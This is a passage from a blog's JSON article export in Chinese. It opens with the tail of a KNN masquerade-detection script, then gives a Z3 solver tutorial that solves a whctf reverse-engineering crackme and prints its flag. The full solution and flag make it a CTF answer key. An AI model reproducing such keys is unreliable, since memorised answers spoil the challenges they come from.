&#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class=\"line\">\t#读取用户操作序列，并做数据清洗</span><br><span class=\"line\">\tuser_cmd_list,dist &#x3D; load_user_cmd_new(&#39;..&#x2F;Capter5&#x2F;MasqueradeDat&#x2F;User3&#39;)</span><br><span class=\"line\">\t#将数据特征化</span><br><span class=\"line\">\tuser_cmd_feature &#x3D; get_user_cmd_feature_new(user_cmd_list,dist)</span><br><span class=\"line\">\t#获得操作序列的标签</span><br><span class=\"line\">\tlabels &#x3D; get_label(&#39;..&#x2F;Capter5&#x2F;MasqueradeDat&#x2F;label.txt&#39;,2)</span><br><span class=\"line\">\t#label.txt中只有后100个序列的标签，前50个都是正常用户的操作序列</span><br><span class=\"line\">\ty &#x3D; [0]*50 + labels</span><br><span class=\"line\">\tneigh   &#x3D; KNeighborsClassifier(n_neighbors &#x3D; 3)</span><br><span class=\"line\">\t#交叉验证，10次随机取样，n_jobs&#x3D;-1表示使用全部CPU运行</span><br><span class=\"line\">\tprint(model_selection.cross_val_score(neigh,user_cmd_feature,y,n_jobs&#x3D;-1,cv&#x3D;10))</span><br></pre></td></tr></table></figure>\n","text":"  版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。  本文链接：https://blog.csdn.net/s1054436218/article/details/79154640网络空间安全和AI几乎是当下最热的两门话题","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"CSDN迁移","slug":"CSDN迁移","count":6,"path":"api/tags/CSDN迁移.json"}]},{"title":"使用z3约束器解决CTF中的题目","slug":"使用z3约束器解决CTF中的题目","date":"2017-11-28T02:53:22.000Z","updated":"2021-02-22T15:52:29.772Z","comments":true,"path":"api/articles/使用z3约束器解决CTF中的题目.json","excerpt":"","keywords":null,"cover":null,"content":"<p><a href=\"http://creativecommons.org/licenses/by-sa/4.0/\"> </a> 版权声明：本文为博主原创文章，遵循<a href=\"http://creativecommons.org/licenses/by-sa/4.0/\"> CC 4.0 BY-SA </a>版权协议，转载请附上原文出处链接和本声明。  本文链接：<a href=\"https://blog.csdn.net/s1054436218/article/details/78651075\">https://blog.csdn.net/s1054436218/article/details/78651075</a></p>\n<p>Z3是什么？Z3由微软开发的一套约束求解器，你可以简单的理解它是解方程的神器。在CTF题目中，我们经常遇到一些给定的条件，或是算法难以逆向、或是涉及到未知的数学技巧又或是爆破时间过长，而在我们学会使用z3后，一类问题便迎刃而解了。想了解更多关于z3知识的，这里有篇专栏：<a href=\"https://zhuanlan.zhihu.com/p/30548907\">点我</a></p>\n<p>一个简单的例子给大家介绍一下z3如何使用：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;&gt;&gt; from z3 import *</span><br><span class=\"line\">&gt;&gt;&gt; x &#x3D; Int(&#39;x&#39;)</span><br><span class=\"line\">&gt;&gt;&gt; y &#x3D; Int(&#39;y&#39;)</span><br><span class=\"line\">&gt;&gt;&gt; solve(x+y&#x3D;&#x3D;4)</span><br><span class=\"line\">[y &#x3D; 0, x &#x3D; 4]</span><br></pre></td></tr></table></figure>\n<p>它为我们提供了一个关于x+y==4的解，可是如果我们想要x=3呢？</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;&gt;&gt; solve(x&#x3D;&#x3D;3,x+y&#x3D;&#x3D;4)</span><br><span class=\"line\">[y &#x3D; 1, x &#x3D; 3]</span><br></pre></td></tr></table></figure>\n<p>当然了，z3能做的肯定不止这么简单的运算，例如：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;&gt;&gt; from z3 import *</span><br><span class=\"line\">&gt;&gt;&gt; x &#x3D; Real(&#39;x&#39;)</span><br><span class=\"line\">&gt;&gt;&gt; y &#x3D; Real(&#39;y&#39;)</span><br><span class=\"line\">&gt;&gt;&gt; solve(x**2 + y**2 &#x3D;&#x3D; 3, x**3 &#x3D;&#x3D; 2)</span><br><span class=\"line\">[x &#x3D; 1.2599210498?, y &#x3D; -1.1885280594?]</span><br></pre></td></tr></table></figure>\n<p>OK，大概了解到它是干嘛的我们就开始看一道例题吧。二进制文件可以在<a href=\"https://github.com/UnnameBao/My_ctf_path/tree/master/blog/I_Hate_Math\">这里</a>下载。</p>\n<p>这是whctf的一道逆向题，它的核心代码如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">v1 &#x3D; 0;</span><br><span class=\"line\">gets(flag);</span><br><span class=\"line\">for ( i &#x3D; 0; i &lt;&#x3D; 35; ++i )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  if ( !flag[i] )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    flag[i] &#x3D; 1;</span><br><span class=\"line\">    ++v1;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">if ( v1 !&#x3D; 9 )</span><br><span class=\"line\">  exit(0);</span><br><span class=\"line\">convert(a);</span><br><span class=\"line\">Transposition(a);</span><br><span class=\"line\">Multi(a, b);</span><br><span class=\"line\">for ( j &#x3D; 0; j &lt;&#x3D; 5; ++j )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  for ( k &#x3D; 0; k &lt;&#x3D; 5; ++k )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    if ( c[0][k + 6 * j] !&#x3D; d[0][k + 6 * j] )</span><br><span class=\"line\">      exit(0);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">printf(&quot;congratulations!you have gottern the flag!&quot;);</span><br></pre></td></tr></table></figure>\n<p>其中convert(a)是将flag赋值给a，你可以把a当做一个6*6的矩阵。 Transposition(a)是把a的转置矩阵赋值给b</p>\n<p>Multi(a,b)是把a和b的乘积赋值给c</p>\n<p>而d就是堆中正确的flag经过上述运算后的结果，也就是说，如果用简单的思路去做，就是想办法爆破27位的flag添加9位1到尾部，然后经过运算结果为d中的值。但未知位数已经达到了20个，常规的爆破思路很难解决，网上的一篇writeup是经过一系列数学运算后逐行爆破，但每行依旧要消耗近10分钟的时间。在实际比赛的过程中，时间始终是最宝贵的，况且如果你对线性代数不太理解，可能会有一些棘手。</p>\n<p>首先数学知识当然是必要的，我们应该保持着一个敬畏之心去学习这里的数学原理，但为了节省时间，或许用约束器去做会有意想不到的效果。</p>\n<p>以下是我的脚本，注释的很详细就不多说了：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#coding:utf-8</span><br><span class=\"line\">&#39;&#39;&#39;</span><br><span class=\"line\">\t@DateTime: \t2017-11-28 10:19:29</span><br><span class=\"line\">\t@Version: \t1.0</span><br><span class=\"line\">\t@Author: \tUnname_Bao</span><br><span class=\"line\">&#39;&#39;&#39;</span><br><span class=\"line\">from z3 import *</span><br><span class=\"line\">import time</span><br><span class=\"line\">t1 &#x3D; time.time()</span><br><span class=\"line\">#创建一个解决方案实例</span><br><span class=\"line\">solver &#x3D; Solver()</span><br><span class=\"line\">#flag长度先设置为36，包括尾部的9个1</span><br><span class=\"line\">flag &#x3D; [Int(&#39;flag%d&#39;%i) for i in range(36)]</span><br><span class=\"line\">#保存flag的矩阵</span><br><span class=\"line\">a &#x3D; [i for i in flag]</span><br><span class=\"line\">#保存flag的转置矩阵</span><br><span class=\"line\">b &#x3D; [i for i in range(36)]</span><br><span class=\"line\">#保存a*b的矩阵</span><br><span class=\"line\">c &#x3D; [0 for i in range(36)]</span><br><span class=\"line\">#堆中正确flag的运算结果</span><br><span class=\"line\">d &#x3D; [0x12027,0x0F296,0x0BF0E,0x0D84C,0x91D8,0x297,</span><br><span class=\"line\">\t0x0F296,0x0D830,0x0A326,0x0B010,0x7627,0x230,</span><br><span class=\"line\">\t0x0BF0E,0x0A326,0x8FEB,0x879D,0x70C3,0x1BD,</span><br><span class=\"line\">\t0x0D84C,0x0B010,0x879D,0x0B00D,0x6E4F,0x1F7,</span><br><span class=\"line\">\t0x91D8,0x7627,0x70C3,0x6E4F,0x9BDC,0x15C,</span><br><span class=\"line\">\t0x297,0x230,0x1BD,0x1F7,0x15C,0x6]</span><br><span class=\"line\">#获得a的转置矩阵</span><br><span class=\"line\">for i in range(6):</span><br><span class=\"line\">\tfor j in range(6):</span><br><span class=\"line\">\t\tb[i+6*j] &#x3D; a[6*i+j]</span><br><span class=\"line\">#运算a*b</span><br><span class=\"line\">for i in range(6):</span><br><span class=\"line\">\tfor j in range(6):</span><br><span class=\"line\">\t\tfor k in range(6):</span><br><span class=\"line\">\t\t\tc[j+6*i] &#x3D; c[j+6*i] + a[6*i+k]*b[6*k+j]</span><br><span class=\"line\">\t\t#添加约束，正确flag的运算结果</span><br><span class=\"line\">\t\tsolver.add(simplify(c[j+6*i]) &#x3D;&#x3D; d[j+6*i])</span><br><span class=\"line\">#添加约束，除了尾部，flag的字符一定在可见字符范围内</span><br><span class=\"line\">for i in range(6,36-10):</span><br><span class=\"line\">\tsolver.add(flag[i]&gt;&#x3D;32)</span><br><span class=\"line\">\tsolver.add(flag[i]&lt;&#x3D;127)</span><br><span class=\"line\">#添加约束，由于flag有格式，前6位一定为whctf&#123;</span><br><span class=\"line\">for i in range(6):</span><br><span class=\"line\">\tsolver.add(flag[i] &#x3D;&#x3D; ord(&#39;whctf&#123;&#39;[i]))</span><br><span class=\"line\">#添加约束，flag的尾部为9个1</span><br><span class=\"line\">for i in range(36-9,36):</span><br><span class=\"line\">\tsolver.add(flag[i] &#x3D;&#x3D; 0x1)</span><br><span class=\"line\">#添加约束，flag的最后一个肯定是&#125;</span><br><span class=\"line\">solver.add(flag[-10] &#x3D;&#x3D; ord(&#39;&#125;&#39;))</span><br><span class=\"line\">#这里一定要有，不check的话会报错</span><br><span class=\"line\">if solver.check() &#x3D;&#x3D; sat:</span><br><span class=\"line\">\tm &#x3D; solver.model()</span><br><span class=\"line\">\ts &#x3D; []</span><br><span class=\"line\">\t#获得结果</span><br><span class=\"line\">\tfor i in range(36):</span><br><span class=\"line\">\t\ts.append(m[flag[i]].as_long())</span><br><span class=\"line\">\t#输出flag</span><br><span class=\"line\">\tprint(bytes(s))</span><br><span class=\"line\">else:</span><br><span class=\"line\">\tprint(&#39;error&#39;)</span><br><span class=\"line\">t2 &#x3D; time.time()</span><br><span class=\"line\">print(t2-t1)</span><br></pre></td></tr></table></figure>\n<p>这是最终的运行结果：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">D:\\2017_WEB_Test\\ulb_manager\\backend\\spider&gt;python z3test.py</span><br><span class=\"line\">b&#39;whctf&#123;Y0u_ar3_g00d_a7_m4th&#125;\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01&#39;</span><br><span class=\"line\">4.042840003967285</span><br></pre></td></tr></table></figure>\n<p>是的，仅仅用了4s就跑出了最终结果、可见z3约束器的强大！</p>\n<p>更多信息请看z3的官方GitHub：<a href=\"https://github.com/Z3Prover/z3\">点我</a></p>\n","text":"  版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。  本文链接：https://blog.csdn.net/s1054436218/article/details/78651075Z3是什么？Z3由微软开发的一套约束求解器","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"CSDN迁移","slug":"CSDN迁移","count":6,"path":"api/tags/CSDN迁移.json"}]}]}